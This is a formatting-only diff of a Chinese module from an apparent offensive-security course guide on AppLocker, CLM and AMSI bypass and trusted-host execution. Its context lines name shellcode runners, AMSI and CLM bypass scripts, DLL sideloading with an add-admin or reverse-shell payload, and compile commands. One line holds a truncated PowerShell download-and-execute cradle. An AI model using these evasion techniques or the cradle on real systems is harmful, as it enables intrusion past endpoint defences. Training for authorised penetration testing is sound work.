@@ -4,11 +4,11 @@
 
 # 05 · AppLocker / CLM / AMSI 绕过与受信任宿主
 
-> **覆盖场景：**18、19、20、21、22、23、24
+> **覆盖场景：** 18、19、20、21、22、23、24
 >
-> **教材依据：**第 11 章（AV 规避）、第 13 章（AppLocker / CLM 绕过）、第 8–9 章（托管程序集加载）
+> **教材依据：** 第 11 章（AV 规避）、第 13 章（AppLocker / CLM 绕过）、第 8–9 章（托管程序集加载）
 >
-> **前置依赖：**一个可执行代码的入口（宏 / HTA / JScript / Web）；目标有 Defender + 可能启用 AppLocker、CLM；攻击机可编译 C#/C
+> **前置依赖：** 一个可执行代码的入口（宏 / HTA / JScript / Web）；目标有 Defender + 可能启用 AppLocker、CLM；攻击机可编译 C#/C
 
 **本模块的共同原则**：先**分清被拦的是"加载器"还是"执行内容"**。这两类失败的修法完全不同——加载器被查杀要改静态特征与宿主形态，执行内容被拦要改行为与分阶段。考试里最常见的错误是：被拦后只反复改静态编码，而问题其实出在行为。
 
@@ -57,7 +57,7 @@
 | `m01-shellcode-runner-x64.cs` | 自定义 C# Runner（含 XOR 解密） | 替换密文数组与 key |
 | `m05-amsi-bypass-variants.ps1` | PowerShell 路线时的 AMSI 处理 | 见脚本内说明 |
 
-#### `m13-xor-encoder.py` {#m13-xor-encoder-py}
+#### `m13-xor-encoder.py`
 
 ````python
 #!/usr/bin/env python3
@@ -166,7 +166,7 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-shellcode-runner-x64.cs` {#m01-shellcode-runner-x64-cs}
+#### `m01-shellcode-runner-x64.cs`
 
 ````csharp
 // 用途：自定义 x64 shellcode Runner（预编译使用，避免 Add-Type 动态编译落地临时文件）
@@ -243,7 +243,7 @@ class Runner
 }
 ````
 
-#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}
+#### `m05-amsi-bypass-variants.ps1`
 
 ````powershell
 <#
@@ -420,7 +420,7 @@ if ($ProbeOnly) {
 | `m05-clm-bypass-runspace.ps1` | 托管内存执行备选 | 见脚本 |
 | `m05-amsi-bypass-variants.ps1` | 脚本路线的 AMSI 处理 | 见脚本 |
 
-#### `m05-clm-bypass-runspace.ps1` {#m05-clm-bypass-runspace-ps1}
+#### `m05-clm-bypass-runspace.ps1`
 
 ````powershell
 <#
@@ -557,7 +557,7 @@ Write-Output "    3) 下载执行第二阶段：IEX (New-Object Net.WebClient).D
 | `m05-installutil-runner.cs` | 托管程序集加载器模板 | 替换程序集路径/入口 |
 | `m01-reflective-runner.ps1` | PowerShell 反射加载 | 替换 DLL 路径与参数 |
 
-#### `m05-installutil-runner.cs` {#m05-installutil-runner-cs}
+#### `m05-installutil-runner.cs`
 
 ````csharp
 // 用途：InstallUtil 兼容托管 Runner——一个可被 InstallUtil.exe 调用的 .NET 安装器类，
@@ -666,7 +666,7 @@ public class Runner : Installer
 }
 ````
 
-#### `m01-reflective-runner.ps1` {#m01-reflective-runner-ps1}
+#### `m01-reflective-runner.ps1`
 
 ````powershell
 <#
@@ -792,7 +792,7 @@ try {
 |---|---|---|
 | `m05-applocker-enum.ps1` | 枚举有效规则 + 可写允许路径 | `-PayloadPath` 可选 |
 
-#### `m05-applocker-enum.ps1` {#m05-applocker-enum-ps1}
+#### `m05-applocker-enum.ps1`
 
 ````powershell
 <#
@@ -946,7 +946,7 @@ x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def 
 | `m04-proxy-dll-newadmin.c` | DLL 载荷（加管理员/反连） | LHOST/LPORT |
 | `m04-build-sideload-package.py` | 打包宿主 + DLL | 宿主版本、架构 |
 
-#### `m04-proxy-dll-sideload.c` {#m04-proxy-dll-sideload-c}
+#### `m04-proxy-dll-sideload.c`
 
 ````c
 /*
@@ -1033,7 +1033,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
  */
 ````
 
-#### `m04-proxy-dll-newadmin.c` {#m04-proxy-dll-newadmin-c}
+#### `m04-proxy-dll-newadmin.c`
 
 ````c
 /*
@@ -1244,7 +1244,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
 }
 ````
 
-#### `m04-build-sideload-package.py` {#m04-build-sideload-package-py}
+#### `m04-build-sideload-package.py`
 
 ````python
 #!/usr/bin/env python3
@@ -1479,7 +1479,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:pay
 | `m05-workflow-compiler-runner.cs` | Workflow 宿主输入程序集 | 替换载荷逻辑 |
 | `m05-lolbas-notes.md` | 受信任宿主速查 | — |
 
-#### `m05-workflow-compiler-runner.cs` {#m05-workflow-compiler-runner-cs}
+#### `m05-workflow-compiler-runner.cs`
 
 ````csharp
 // 用途：Workflow Compiler 受信任宿主——被 Microsoft.Workflow.Compiler.exe 加载执行的程序集
@@ -1548,7 +1548,7 @@ namespace Payload
 }
 ````
 
-#### `m05-lolbas-notes.md` {#m05-lolbas-notes-md}
+#### `m05-lolbas-notes.md`
 
 ````markdown
 # 受信任宿主速查（场景 21–24）
@@ -1653,7 +1653,7 @@ where mshta
 | `m05-xsl-exec.xsl` | XSL 脚本执行模板 | 替换 LHOST/URL |
 | `m05-lolbas-notes.md` | 宿主调用方式速查 | — |
 
-#### `m05-xsl-exec.xsl` {#m05-xsl-exec-xsl}
+#### `m05-xsl-exec.xsl`
 
 ````xml
 <?xml version="1.0"?>
